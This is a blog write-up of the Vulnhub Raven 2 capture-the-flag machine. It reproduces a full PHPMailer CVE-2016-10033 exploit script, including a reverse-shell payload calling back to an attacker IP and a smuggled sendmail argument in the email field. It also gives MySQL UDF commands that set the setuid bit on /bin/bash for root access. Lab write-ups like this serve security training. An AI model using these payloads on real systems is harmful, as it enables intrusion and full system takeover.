---
layout: default
title : muzec - Raven 2 Writeup
---


![image](https://user-images.githubusercontent.com/69868171/120069538-6f2df200-c054-11eb-9335-833c8f9968d5.png)

Raven 2 is part of the series of Raven on Vulnhub very interesting challenge you can grab a copy here [Download Raven Series Here](https://www.vulnhub.com/series/raven,176/) .

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Fri May 28 04:57:42 2021 as: nmap -sC -p- -sV -oA nmap 172.16.139.189
Nmap scan report for 172.16.139.189
Host is up (0.00017s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Raven Security
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          32986/tcp   status
|   100024  1          33140/tcp6  status
|   100024  1          37138/udp6  status
|_  100024  1          59200/udp   status
32986/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 28 04:57:56 2021 -- 1 IP address (1 host up) scanned in 14.65 seconds
```

We got 4 open ports when i scan for full ports 22,80,111 and 32986 let burst some directory since we know port 80 is active.

![image](https://user-images.githubusercontent.com/69868171/120069834-f29c1300-c055-11eb-8807-c235bc857ddb.png)

Wordpress directory cool let check it .

![image](https://user-images.githubusercontent.com/69868171/120069863-195a4980-c056-11eb-9e64-1c0c00ad37d1.png)

It actually a wordpress page using wpscan to enumerate for users.

![image](https://user-images.githubusercontent.com/69868171/120069913-62120280-c056-11eb-82da-71011d84fc24.png)

Got 2 users i trying brute forcing but got no luck so let go back to our gobuster result but i decided to check the wordpress uploads page.

![image](https://user-images.githubusercontent.com/69868171/120070006-cd5bd480-c056-11eb-8c1a-814156574043.png)

And boom we have our flag.

![image](https://user-images.githubusercontent.com/69868171/120070030-f67c6500-c056-11eb-8188-76da7086d0d3.png)

Now let go back to the gobuster results.

![image](https://user-images.githubusercontent.com/69868171/120070062-27f53080-c057-11eb-92a9-9cc0f7eb5e3f.png)

Checking `vendor` .

![image](https://user-images.githubusercontent.com/69868171/120070151-6f7bbc80-c057-11eb-90e4-c10e34e1a5f1.png)

Let check the `PATH` and we have our first flag.

![image](https://user-images.githubusercontent.com/69868171/120070235-8b7f5e00-c057-11eb-8ea6-f808a2787e7c.png)

Seeing PHPMailer seems we are dealing with that so i try checking for the version and boom we have it in the `VERSION` page.

![image](https://user-images.githubusercontent.com/69868171/120070296-c1244700-c057-11eb-83f8-0c2d2f095b50.png)

Using a quick `searchsploit` to check for exploit and we have a list of exploits.

![image](https://user-images.githubusercontent.com/69868171/120070341-03e61f00-c058-11eb-89c2-aa7faaf5c42e.png)

Let try the python exploit and see going through the exploit seems we need a page that is sending a mail to the web server and the one that stand out is the `contact.php` .

![image](https://user-images.githubusercontent.com/69868171/120070420-78b95900-c058-11eb-9b49-66944043e2d8.png)

Now let edit our exploit.

```
"""
# Exploit Title: PHPMailer Exploit v1.0
# Date: 29/12/2016
# Exploit Author: Daniel aka anarc0der
# Version: PHPMailer < 5.2.18
# Tested on: Arch Linux
# CVE : CVE 2016-10033

Description:
Exploiting PHPMail with back connection (reverse shell) from the target

Usage:
1 - Download docker vulnerable enviroment at: https://github.com/opsxcq/exploit-CVE-2016-10033
2 - Config your IP for reverse shell on payload variable
4 - Open nc listener in one terminal: $ nc -lnvp <your ip>
3 - Open other terminal and run the exploit: python3 anarcoder.py

Video PoC: https://www.youtube.com/watch?v=DXeZxKr-qsU

Full Advisory:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
"""

from requests_toolbelt import MultipartEncoder
import requests
import os
import base64
from lxml import html as lh

os.system('clear')
print("\n")
print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")
print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")
print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")
print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
print("      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com")
print(" Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski\n")

target = 'http://raven.local/contact.php'
backdoor = '/rev.php'

payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'172.20.10.4\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
fields={'action': 'submit',
        'name': payload,
        'email': '"anarcoder\\\" -OQueueDirectory=/tmp -X/var/www/html/rev.php server\" @protonmail.com',
        'message': 'Pwned'}

m = MultipartEncoder(fields=fields,
                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

headers={'User-Agent': 'curl/7.47.0',
         'Content-Type': m.content_type}

proxies = {'http': 'localhost:8081', 'https':'localhost:8081'}


print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
r = requests.post(target, data=m.to_string(),
                  headers=headers)
print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
r = requests.get(target+backdoor, headers=headers)
if r.status_code == 200:
    print('[+]  ExPLoITeD ' + target)
```

Remember to edit it to your IP for gettting a reverse shell.

![image](https://user-images.githubusercontent.com/69868171/120070504-de0d4a00-c058-11eb-8114-04fdf99c0d4a.png)

Let start and Ncat listener and run the exploit.

![image](https://user-images.githubusercontent.com/69868171/120070557-2298e580-c059-11eb-9ce8-cb267df2063c.png)

Now let access the backdoor we just added `rev.php` to get our shell.

`http://raven.local/rev.php`  going to our listener and we have our shell.

![image](https://user-images.githubusercontent.com/69868171/120070638-815e5f00-c059-11eb-800c-9b20c6de25f1.png)

Spawning TTY shell ` python -c 'import pty; pty.spawn ("/bin/bash")'` so i try finding the flag2 first since we have 1 and 3 already .

`find / -name flag2.txt 2>/dev/null` and boom we have it.

![image](https://user-images.githubusercontent.com/69868171/120070820-558fa900-c05a-11eb-85da-a4661ecb2edc.png)

Now let go get the last flag probably it will be in the root folder for sure so i try checking how many users we have on the target.

### Privilege Escalation

![image](https://user-images.githubusercontent.com/69868171/120070852-7d7f0c80-c05a-11eb-8ba8-6688f87eabf9.png)

Going through the home directory for each users i found nothing so i decided to run `linpeas.sh` and between i found the MYSQL credentials.

![image](https://user-images.githubusercontent.com/69868171/120070984-0f871500-c05b-11eb-89ba-b68df29e8003.png)

But nothing interesting in the databases but can be usefull keep it and let run our `linpeas.sh` .

![image](https://user-images.githubusercontent.com/69868171/120071112-b23f9380-c05b-11eb-83a6-645a86d1faa1.png)

So we found a `MySQL-Exploit-Remote-Root-Code-Execution-Privesc` vulnerability link here `https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html` also i try to confirm the version.

![image](https://user-images.githubusercontent.com/69868171/120071183-0fd3e000-c05c-11eb-9a00-13d0f7a6b999.png)

Cool let find our exploit.

![image](https://user-images.githubusercontent.com/69868171/120071251-5aedf300-c05c-11eb-82e8-6e9b4250be1f.png)

So i download the exploit on my machine seems we need to compile it let hit it.

`gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc`

![image](https://user-images.githubusercontent.com/69868171/120071337-cdf76980-c05c-11eb-88d2-31c089d204dc.png)

Now let transfer it to our target.

![image](https://user-images.githubusercontent.com/69868171/120071380-0f881480-c05d-11eb-8fcf-f8a4f54da8e1.png)


Now we logged in to the MySQL.

`mysql -u root -p`

![image](https://user-images.githubusercontent.com/69868171/120071420-5970fa80-c05d-11eb-9d86-36ac2c10a4ad.png)

Now we are in MYSQL let create a table.

`use mysql;`

![image](https://user-images.githubusercontent.com/69868171/120071643-43b00500-c05e-11eb-84c9-70da365fe32b.png)

In this table, we inserted the link to 1518.so file we just imported from the local machine to /tmp directory.

We dumped the same file to /usr/lib/mysql/plugin/ directory (since it was vulnerable)

In the most important step, we created a UDF function named do_system, that will invoke the code that implements the function.

Hence, we are invoking the code “chmod u+s /bin/bash" to set the sticky bit on "bash"

```
create table shell(line blob);
insert into shell values(load_file('/tmp/1518.so'));
select * from shell into dumpfile '/usr/lib/mysql/plugin/1518.so';
create function do_system returns integer soname '1518.so';
select do_system('chmod u+s /bin/bash');
```

![image](https://user-images.githubusercontent.com/69868171/120071710-7f4acf00-c05e-11eb-8076-a8e9dbc30e02.png)

Now to get our root shell we are going to use `/bin/bash -p` and we should have root shell.

![image](https://user-images.githubusercontent.com/69868171/120071962-71e21480-c05f-11eb-89e0-da1ef568b2ca.png)

Getting the last flag.

![image](https://user-images.githubusercontent.com/69868171/120071986-89210200-c05f-11eb-8a84-d6751b6f3eb3.png)

We are root and done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
